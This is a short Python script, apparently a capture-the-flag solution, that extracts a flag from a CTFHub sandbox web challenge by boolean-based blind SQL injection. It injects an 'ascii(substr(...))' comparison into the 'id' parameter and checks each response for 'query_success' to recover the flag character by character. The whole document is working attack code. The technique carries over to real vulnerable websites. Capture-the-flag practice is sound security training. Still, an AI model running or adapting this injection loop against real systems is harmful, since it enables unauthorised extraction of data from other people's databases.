import requests


name = ''
for j in range(1,50):
	for i in range(48,126):
		payload='http://challenge-bbecad0160de1d32.sandbox.ctfhub.com:10080/?id=1 and ascii(substr((select flag from sqli.flag),%d,1))=%d' %(j,i)
		r = requests.get(payload)
		if "query_success" in r.text:
			name = name + chr(i)
			print(name)
			break